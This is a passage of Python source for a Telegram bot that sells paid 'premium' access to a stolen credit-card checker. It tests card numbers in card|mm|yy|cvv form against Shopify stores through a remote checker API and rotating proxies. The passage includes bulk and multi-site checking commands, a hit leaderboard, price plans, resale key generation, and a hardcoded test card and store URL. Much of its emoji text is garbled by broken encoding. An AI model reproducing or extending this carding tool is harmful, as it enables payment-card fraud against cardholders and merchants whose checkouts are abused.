        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        else:
            return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ========== BOT COMMANDS ==========
joined_users = set()
def set_user_joined(user_id):
    joined_users.add(user_id)

@bot.on(events.NewMessage(pattern=r'^/start(@\w+)?(\s+.*)?$'))
async def start(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned from using this bot."))
    
    joined, missing_chats = await check_user_joined(user_id)
    if not joined:
        buttons = []
        for link in missing_chats:
            buttons.append([Button.url("馃摙 Join Channel", link)])
        buttons.append([Button.inline("鉁� Joined", b"check_joined")])
        missing_text = "\n".join([f"鈥� <a href='{link}'>Click here to join</a>" for link in missing_chats])
        return await event.reply(premium_emoji(f"<b>鈿狅笍 Access Denied!</b>\n\nYou must join the following channels first:\n\n{missing_text}\n\nThen click 'Joined' button."), buttons=buttons, parse_mode='html')
    
    set_user_joined(user_id)
    is_prem = is_premium(user_id)
    is_adm = is_admin(user_id)
    credits = get_user_credits(user_id)
    plan_name = get_user_plan_name(user_id)
    
    text = f"""<b>馃挸 Welcome to nomi </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悅饾悅 饾悅饾惃饾惁饾惁饾悮饾惂饾悵饾惉</b>
<blockquote>鈥� /cc card|mm|yy|cvv - Check single CC (1 credit)
鈥� /chk - Reply to .txt file to check cards (1 credit per card)
鈥� /multi card1|mm|yy|cvv card2|mm|yy|cvv - Check 10 cards at once
鈥� /mcc card|mm|yy|cvv - Check 1 card against ALL sites
鈿狅笍NOTE - 
鈥�  No proxy or site setup needed! 
鈥� The bot comes with pre-configured 
   proxies & sites. 
鈥� Just use /cc or /chk and start
   checking cards instantly! 馃挸</blockquote>

	<b>馃攷 饾悞饾悽饾惌饾悶 饾悅饾惃饾惁饾惁饾悮饾惂饾悵饾惉</b>
	<blockquote>鈥� /site - Check all sites & remove dead
	鈥� /addsite site.com - Add single site
	鈥� /addsitetxt - Add sites from .txt file (bulk)
	鈥� /rm url - Remove a specific site
	鈥� /clearsite - Clear all sites (with backup)
	鈥� /getsites - Get all sites list</blockquote>
<b>馃攷 饾悘饾惈饾惃饾惐饾惒 饾悅饾惃饾惁饾惁饾悮饾惂饾悵饾惉</b>
<blockquote>鈥� /proxy - Check all proxies & remove dead
鈥� /addproxy - Add proxies (one per line)
鈥� /addproxytxt - Add proxies from .txt file (bulk)
鈥� /chkproxy proxy - Check single proxy
鈥� /rmproxy proxy - Remove single proxy
鈥� /rmproxyindex 1,2,3 - Remove by index
鈥� /clearproxy - Remove all proxies
鈥� /getproxy - Get all proxies
鈥� /setproxy proxy - Set your personal proxy for mass checking
鈥� /myproxy - View your personal proxies
鈥� /delmyproxy proxy - Delete a personal proxy
鈥� /clearmyproxy - Clear all your personal proxies</blockquote>
<b>馃攷 饾悅饾惈饾悶饾悵饾悽饾惌饾惉 & 饾悐饾悶饾惒饾惉</b>
<blockquote>鈥� /redeem KEY - Redeem premium key (Premium + Credits)
鈥� /redeemcredit KEY - Redeem credit key (Only credits)
鈥� /plans - Check premium plans
鈥� /info - Your account details & credits
鈥� /myhistory - Your hit statistics
鈥� /transfercredits user_id amount - Transfer credits
鈥� /ping - Check bot response time
鈥� /refer - Get your referral code & earn credits
鈥� /topusers - Top 10 hit leaderboard
鈿狅笍JOIN LOGS - https://t.me/dududadadee2</blockquote>"""
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        if expiry != 'Unknown':
            expiry_dt = datetime.fromisoformat(expiry)
            expiry_str = expiry_dt.strftime('%Y-%m-%d')
        else:
            expiry_str = 'Unknown'
        text += f"\n\n<b>馃拵 Premium Access Active!</b>\n<b>馃搵 Plan:</b> {plan_name}\n<b>馃挵 Credits Available:</b> {credits}\n<b>馃搮 Expires:</b> {expiry_str}"
    else:
        text += f"\n\n<b>鈿狅笍 Premium required for /cc and /chk commands</b>\n<b>馃挵 Credits Available:</b> {credits}"
    
    if is_adm:
        text += """\n<b>馃挔 饾悁饾悵饾惁饾悽饾惂 饾悅饾惃饾惁饾惁饾悮饾惂饾悵饾惉</b>
<blockquote>鈥� /filter - Set site price filter
鈥� /addpremium user_id plan_name - Add premium with plan
鈥� /addpremiumcustom user_id days credits - Add custom premium
鈥� /removepremium user - Remove premium
鈥� /addcredits user amount - Add credits to user
鈥� /removecredits user amount - Remove credits from user
鈥� /genpremiumkey amount plan - Generate premium keys
鈥� /genpremiumkey amount custom days credits - Generate custom premium keys
鈥� /gencreditkey amount credits - Generate credit-only keys
鈥� /ban user - Ban user
鈥� /unban user - Unban user
鈥� /stats - Bot statistics
鈥� /allstats - Full stats with hit history
鈥� /userlist - List all premium users
鈥� /checkcredits user_id - Check user credits
鈥� /setcredits user_id amount - Set exact credits
鈥� /exportstats - Export full hit stats file
鈥� /activecheck - See who is checking now
鈥� /broadcast msg - Broadcast message to ALL users
鈥� /groupmode on/off - Enable/disable bot in current group</blockquote>"""
    
    text += f"\n\n<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>\n馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/info(@\w+)?(\s+.*)?$'))
async def info_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    credits = get_user_credits(user_id)
    is_prem = is_premium(user_id)
    plan_name = get_user_plan_name(user_id)
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        days_added = premium_data.get('days', 0)
        added_at = premium_data.get('added_at', 'Unknown')
        if expiry != 'Unknown':
            expiry_dt = datetime.fromisoformat(expiry)
            expiry_str = expiry_dt.strftime('%Y-%m-%d %H:%M:%S')
            days_left = (expiry_dt - datetime.now()).days
        else:
            expiry_str = 'Unknown'
            days_left = 0
        
        text = f"""<b>馃拵 YOUR ACCOUNT INFO 馃拵</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃懁 User ID:</b> <code>{user_id}</code>
<b>猸� Status:</b> <b>PREMIUM</b>
<b>馃搵 Plan:</b> {plan_name}
<b>馃挵 Credits:</b> {credits}
<b>馃搮 Premium Expires:</b> {expiry_str}
<b>鈴� Days Left:</b> {days_left} days
<b>馃搯 Plan Duration:</b> {days_added} days
<b>馃晲 Activated:</b> {added_at}

<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
馃挕 Use /plans to see available plans
馃挕 Contact @Mydev1 to recharge

馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"""
    else:
        text = f"""<b>鈿狅笍 YOUR ACCOUNT INFO 鈿狅笍</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃懁 User ID:</b> <code>{user_id}</code>
<b>猸� Status:</b> FREE USER
<b>馃搵 Plan:</b> FREE
<b>馃挵 Credits:</b> {credits}

<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
馃拵 Premium Required to use /cc and /chk
馃挕 Use /plans to see premium plans
馃挕 Use /redeem to activate premium key
馃挕 Use /redeemcredit to activate credit key

馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"""
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"check_joined"))
async def check_joined_callback(event):
    user_id = event.sender_id
    joined, _ = await check_user_joined(user_id)
    if joined:
        set_user_joined(user_id)
        await event.edit(premium_emoji("鉁� <b>Verification successful!</b>\n\nUse /start again to access the bot."), parse_mode='html')
    else:
        await event.answer("鉂� You haven't joined all channels yet! Please join first.", alert=True)

@bot.on(events.NewMessage(pattern=r'^/plans(@\w+)?(\s+.*)?$'))
async def plans_command(event):
    text = """<b>馃拵 PREMIUM PLANS 馃拵</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃巵 TRIAL</b>
鈥� 1 Day Access
鈥� 3,000 Credits
鈥� Price: 2$
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃 BRONZE</b>
鈥� 3 Days Access
鈥� 8,000 Credits
鈥� Price: 4$
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃 SILVER</b>
鈥� 7 Days Access
鈥� 14,000 Credits
鈥� Price: 8$
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃 GOLD</b>
鈥� 14 Days Access
鈥� 20,000 Credits
鈥� Price: 12$
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃拵 PLATINUM</b>
鈥� 24 Days Access
鈥� 30,000 Credits
鈥� Price: 22$
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

<b>馃悋 How to Purchase?</b>
Contact: <a href="tg://user?id=7415233736">Mydev1</a>

<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
馃 <b>Bot By: <a href="tg://user?id=7415233736">Mydev1</a></b>"""
    await event.reply(premium_emoji(text), parse_mode='html')

# ========== REDEEM COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/redeem(@\w+)?(\s+.*)?$'))
async def redeem_premium_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/redeem PREMIUM_KEY</code>"), parse_mode='html')
    
    key = args[1].strip().upper()
    success, msg = redeem_premium_key(key, user_id)
    
    if success:
        credits = get_user_credits(user_id)
        await event.reply(premium_emoji(f"鉁� <b>{msg}</b>\n\n馃挵 Your Credits: {credits}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"鉂� <b>{msg}</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeemcredit(@\w+)?(\s+.*)?$'))
async def redeem_credit_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("馃毇 You are banned!"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/redeemcredit CREDIT_KEY</code>"), parse_mode='html')
    
    key = args[1].strip().upper()
    success, credits = redeem_credit_key(key, user_id)
    
    if success:
        total_credits = get_user_credits(user_id)
        await event.reply(premium_emoji(f"鉁� <b>Credit Key Redeemed!</b>\n\n馃挵 Added: {credits} credits\n馃挸 Total Credits: {total_credits}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"鉂� <b>{credits}</b>"), parse_mode='html')

# ========== ADMIN - ADD PREMIUM BY PLAN NAME ==========

@bot.on(events.NewMessage(pattern=r'^/addpremium(@\w+)?(\s+.*)?$'))
async def add_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        await event.reply(premium_emoji("鉂� Usage: <code>/addpremium user_id plan_name</code>\n\n<u>Available Plans:</u>\n鈥� trial\n鈥� bronze\n鈥� silver\n鈥� gold\n鈥� platinum\n\nExample: <code>/addpremium 7415233736 platinum</code>"), parse_mode='html')
        return
    
    try:
        target_id = int(args[1])
        plan_key = args[2].lower()
        
        if plan_key not in PLANS:
            await event.reply(premium_emoji(f"鉂� Invalid plan! Available: trial, bronze, silver, gold, platinum"), parse_mode='html')
            return
        
        plan_info = PLANS[plan_key]
        days = plan_info['days']
        credits = plan_info['credits']
        
        add_premium_user(target_id, plan_key, days, credits)
        
        await event.reply(premium_emoji(f"鉁� <b>Premium added!</b>\n\n馃懁 User: <code>{target_id}</code>\n馃搵 Plan: {plan_info['name']}\n馃搮 Days: {days}\n馃挵 Credits: {credits}"), parse_mode='html')
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, premium_emoji(f"馃帀 <b>Premium Access Granted!</b>\n\n馃搵 Plan: {plan_info['name']}\n馃搮 You now have {days} days of premium access with {credits} credits!\n馃搯 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account."), parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply(premium_emoji("鉂� Invalid user_id!"), parse_mode='html')

# ========== ADMIN - ADD CUSTOM PREMIUM WITH DAYS AND CREDITS ==========

@bot.on(events.NewMessage(pattern=r'^/addpremiumcustom(@\w+)?(\s+.*)?$'))
async def add_premium_custom_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 4:
        await event.reply(premium_emoji("鉂� Usage: <code>/addpremiumcustom user_id days credits</code>\n\nExample: <code>/addpremiumcustom 7415233736 15 5000</code>"), parse_mode='html')
        return
    
    try:
        target_id = int(args[1])
        days = int(args[2])
        credits = int(args[3])
        
        if days <= 0 or credits <= 0:
            await event.reply(premium_emoji("鉂� Days and credits must be positive!"), parse_mode='html')
            return
        
        add_premium_user(target_id, "custom", days, credits)
        
        await event.reply(premium_emoji(f"鉁� <b>Custom Premium added!</b>\n\n馃懁 User: <code>{target_id}</code>\n馃搮 Days: {days}\n馃挵 Credits: {credits}"), parse_mode='html')
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, premium_emoji(f"馃帀 <b>Premium Access Granted!</b>\n\n馃搮 You now have {days} days of premium access with {credits} credits!\n馃搯 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account."), parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply(premium_emoji("鉂� Invalid user_id, days, or credits!"), parse_mode='html')

# ========== ADMIN CREDITS COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/addcredits(@\w+)?(\s+.*)?$'))
async def add_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("鉂� Usage: <code>/addcredits user_id amount</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id or amount"), parse_mode='html')
    
    add_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(premium_emoji(f"鉁� <b>Credits Added!</b>\n\nUser: <code>{target_id}</code>\nAdded: {amount}\nNew Total: {new_total}"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"馃挵 <b>{amount} Credits Added!</b>\n\nYour new balance: {new_total} credits"), parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/removecredits(@\w+)?(\s+.*)?$'))
async def remove_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("鉂� Usage: <code>/removecredits user_id amount</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id or amount"), parse_mode='html')
    
    remove_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(premium_emoji(f"鉁� <b>Credits Removed!</b>\n\nUser: <code>{target_id}</code>\nRemoved: {amount}\nNew Total: {new_total}"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"鈿狅笍 <b>{amount} Credits Removed!</b>\n\nYour new balance: {new_total} credits"), parse_mode='html')
    except:
        pass

# ========== ADMIN - REMOVE PREMIUM ==========

@bot.on(events.NewMessage(pattern=r'^/removepremium(@\w+)?(\s+.*)?$'))
async def remove_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/removepremium user_id</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id"), parse_mode='html')
    
    premium_data = load_premium_users()
    if str(target_id) in premium_data:
        del premium_data[str(target_id)]
        save_premium_users(premium_data)
        await event.reply(premium_emoji(f"鉁� <b>Premium removed!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')
        try:
            await bot.send_message(target_id, premium_emoji(f"鈿狅笍 <b>Premium Access Removed!</b>\n\nYour premium access has been revoked."), parse_mode='html')
        except:
            pass
    else:
        await event.reply(premium_emoji(f"鉂� User <code>{target_id}</code> does not have premium"), parse_mode='html')

# ========== ADMIN - SITE MANAGEMENT ==========

@bot.on(events.NewMessage(pattern=r'^/addsite(@\w+)?(\s+.*)?$'))
async def add_site_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/addsite https://store.myshopify.com</code>"), parse_mode='html')
    
    site = args[1].strip()
    success, msg = add_site(site)
    await event.reply(premium_emoji(f"{'鉁�' if success else '鉂�'} <b>{msg}</b>\n\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsitetxt(@\w+)?(\s+.*)?$'))
async def add_site_txt_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply(premium_emoji("馃搶 Reply to a .txt file with sites (one per line)"), parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply(premium_emoji("鉂� Please reply to a .txt file"), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        os.remove(file_path)
        return await event.reply(premium_emoji(f"鉂� Error reading file: {e}"), parse_mode='html')
    
    sites = [line.strip() for line in content.splitlines() if line.strip()]
    if not sites:
        return await event.reply(premium_emoji("鉂� No valid sites found in file"), parse_mode='html')
    
    added, already = add_sites_bulk(sites)
    
    msg = f"<b>馃搳 Sites Processed</b>\n\n"
    msg += f"鉁� Added: {len(added)}\n"
    msg += f"鈿狅笍 Already existed: {len(already)}\n"
    if added:
        msg += f"\n<u>Added sites:</u>\n"
        for s in added[:20]:
            msg += f"鈥� <code>{s}</code>\n"
        if len(added) > 20:
            msg += f"... and {len(added)-20} more"
    
    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== ADMIN - KEY GENERATION ==========

@bot.on(events.NewMessage(pattern=r'^/genpremiumkey(@\w+)?(\s+.*)?$'))
async def gen_premium_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            plan_key = args[2].lower()
            if plan_key not in PLANS:
                return await event.reply(premium_emoji(f"鉂� Invalid plan! Available: {', '.join(PLANS.keys())}, custom"), parse_mode='html')
        except:
            return await event.reply(premium_emoji("鉂� Usage: <code>/genpremiumkey amount plan</code>\n\nExample: <code>/genpremiumkey 5 gold</code>"), parse_mode='html')
        
        keys_generated = []
        days = PLANS[plan_key]['days']
        credits = PLANS[plan_key]['credits']
        for i in range(amount):
            key = generate_premium_key(plan_key, days, credits)
            keys_generated.append(key)
        
        plan = PLANS[plan_key]
        keys_text = "\n".join([f"鈥� <code>{k}</code>" for k in keys_generated])
        msg = f"""鉁� <b>Premium Keys Generated Successfully!</b>

<b>馃搳 Summary:</b>
鈥� Quantity: {amount}
鈥� Plan: {plan['name']}
鈥� Days: {plan['days']}
鈥� Credits: {plan['credits']}
鈥� Price: {plan['price']} each

<b>馃攽 Generated Keys:</b>
{keys_text}

<b>鈿狅笍 Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(premium_emoji(msg), parse_mode='html')
    
    elif len(args) == 5 and args[2].lower() == "custom":
        try:
            amount = int(args[1])
            days = int(args[3])
            credits = int(args[4])
            if amount <= 0 or days <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply(premium_emoji("鉂� Maximum 50 keys at once!"), parse_mode='html')
        except:
            return await event.reply(premium_emoji("鉂� Usage: <code>/genpremiumkey amount custom days credits</code>\n\nExample: <code>/genpremiumkey 5 custom 15 5000</code>"), parse_mode='html')
        
        keys_generated = []
        for i in range(amount):
            key = generate_premium_key("custom", days, credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"鈥� <code>{k}</code>" for k in keys_generated])
        msg = f"""鉁� <b>Custom Premium Keys Generated Successfully!</b>

<b>馃搳 Summary:</b>
鈥� Quantity: {amount}
鈥� Days: {days} per key
鈥� Credits: {credits} per key

<b>馃攽 Generated Keys:</b>
{keys_text}

<b>鈿狅笍 Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(premium_emoji(msg), parse_mode='html')
    
    else:
        await event.reply(premium_emoji("鉂� Usage:\n<code>/genpremiumkey amount plan</code>\nExample: <code>/genpremiumkey 5 gold</code>\n\nOR\n\n<code>/genpremiumkey amount custom days credits</code>\nExample: <code>/genpremiumkey 5 custom 15 5000</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/gencreditkey(@\w+)?(\s+.*)?$'))
async def gen_credit_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            credits = int(args[2])
            if amount <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply(premium_emoji("鉂� Maximum 50 keys at once!"), parse_mode='html')
        except:
            return await event.reply(premium_emoji("鉂� Usage: <code>/gencreditkey amount credits</code>\n\nExample: <code>/gencreditkey 5 5000</code>"), parse_mode='html')
        
        keys_generated = []
        for i in range(amount):
            key = generate_credit_key(credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"鈥� <code>{k}</code>" for k in keys_generated])
        msg = f"""鉁� <b>Credit Keys Generated Successfully!</b>

<b>馃搳 Summary:</b>
鈥� Quantity: {amount}
鈥� Credits: {credits} per key

<b>馃攽 Generated Keys:</b>
{keys_text}

<b>鈿狅笍 Note:</b> Share these keys with users. They can redeem using <code>/redeemcredit KEY</code> to get {credits} credits only (no premium)!"""
        await event.reply(premium_emoji(msg), parse_mode='html')
    
    else:
        await event.reply(premium_emoji("鉂� Usage: <code>/gencreditkey amount credits</code>\nExample: <code>/gencreditkey 5 5000</code>"), parse_mode='html')

# ========== ADMIN - BAN/UNBAN ==========

@bot.on(events.NewMessage(pattern=r'^/ban(@\w+)?(\s+.*)?$'))
async def ban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/ban user_id</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id"), parse_mode='html')
    
    ban_user(target_id)
    await event.reply(premium_emoji(f"鉁� <b>User banned!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"馃毇 <b>You have been banned!</b>\n\nYou can no longer use this bot."), parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/unban(@\w+)?(\s+.*)?$'))
async def unban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/unban user_id</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply(premium_emoji("鉂� Invalid user_id"), parse_mode='html')
    
    unban_user(target_id)
    await event.reply(premium_emoji(f"鉁� <b>User unbanned!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"鉁� <b>You have been unbanned!</b>\n\nYou can now use the bot again."), parse_mode='html')
    except:
        pass

# ========== ADMIN - GROUP MODE ==========

@bot.on(events.NewMessage(pattern=r'^/groupmode(@\w+)?(\s+.*)?$'))
async def groupmode_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    if not event.is_group:
        return await event.reply(premium_emoji("鉂� <b>This command only works in groups!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) < 2:
        return await event.reply(premium_emoji("鉂� Usage: <code>/groupmode on/off</code>"), parse_mode='html')
    
    action = args[1].lower()
    chat_id = event.chat_id
    
    if action == 'on':
        set_group_enabled(chat_id, True)
        await event.reply(premium_emoji("鉁� <b>Bot enabled in this group!</b>\n\nUsers can now use /cc for free checking."), parse_mode='html')
    elif action == 'off':
        set_group_enabled(chat_id, False)
        await event.reply(premium_emoji("鉁� <b>Bot disabled in this group!</b>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("鉂� Usage: <code>/groupmode on/off</code>"), parse_mode='html')

# ========== ADMIN - STATS ==========

@bot.on(events.NewMessage(pattern=r'^/stats(@\w+)?(\s+.*)?$'))
async def stats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    global ACTIVE_FILTER
    premium_data = load_premium_users()
    keys_data = load_keys()
    credit_keys_data = load_credit_keys()
    credits_data = load_credits()
    sites = load_sites()
    proxies = load_proxies()
    banned = load_banned_users()
    
    total_premium = len(premium_data)
    total_keys = len(keys_data)
    used_premium_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_credit_keys = len(credit_keys_data)
    used_credit_keys = sum(1 for k in credit_keys_data.values() if k.get('used', False))
    total_sites = len(sites)
    total_proxies = len(proxies)
    total_banned = len(banned)
    total_credits = sum(credits_data.values())
    
    msg = f"<b>馃搳 Bot Statistics</b>\n\n"
    msg += f"<b>馃懃 Users:</b>\n"
    msg += f"鈥� Premium Users: {total_premium}\n"
    msg += f"鈥� Banned Users: {total_banned}\n\n"
    msg += f"<b>馃挵 Credits:</b>\n"
    msg += f"鈥� Total Credits Active: {total_credits}\n\n"
    msg += f"<b>馃攽 Premium Keys:</b>\n"
    msg += f"鈥� Total Generated: {total_keys}\n"
    msg += f"鈥� Used: {used_premium_keys}\n"
    msg += f"鈥� Unused: {total_keys - used_premium_keys}\n\n"
    msg += f"<b>馃拵 Credit Keys:</b>\n"
    msg += f"鈥� Total Generated: {total_credit_keys}\n"
    msg += f"鈥� Used: {used_credit_keys}\n"
    msg += f"鈥� Unused: {total_credit_keys - used_credit_keys}\n\n"
    msg += f"<b>馃寪 Data:</b>\n"
    msg += f"鈥� Sites: {total_sites}\n"
    msg += f"鈥� Proxies: {total_proxies}\n\n"
    msg += f"<b>馃幆 Active Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n"
    msg += f"馃 <b>Bot By: <a href=\"tg://user?id=7415233736\">Mydev1</a></b>"
    
    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== ADMIN - BROADCAST ==========

@bot.on(events.NewMessage(pattern=r'^/broadcast(@\w+)?(\s+.*)?$'))
